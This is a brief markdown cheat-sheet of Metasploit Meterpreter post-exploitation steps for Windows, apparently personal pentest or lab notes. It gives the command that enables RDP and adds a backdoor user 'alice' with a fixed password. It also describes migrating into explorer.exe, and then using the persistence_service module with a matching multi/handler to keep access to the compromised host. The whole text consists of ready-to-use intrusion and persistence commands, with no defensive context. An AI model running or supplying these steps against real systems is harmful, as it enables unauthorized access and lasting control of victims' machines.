**Windows:**
- Activate RDP through Meterpreter: **run getgui -e -u alice -p hack_123321** 
  this commands adds user **alice** with password **hack_123321** and this can be accessed via xfreerdp
- For the above exploit, you need to be an admin user. Do it by: **migrate -N explorer.exe** 
- Use exploit **exploit/windows/local/persistence_service** for creating a persistent service and open a multi/handler having the **same payload**.

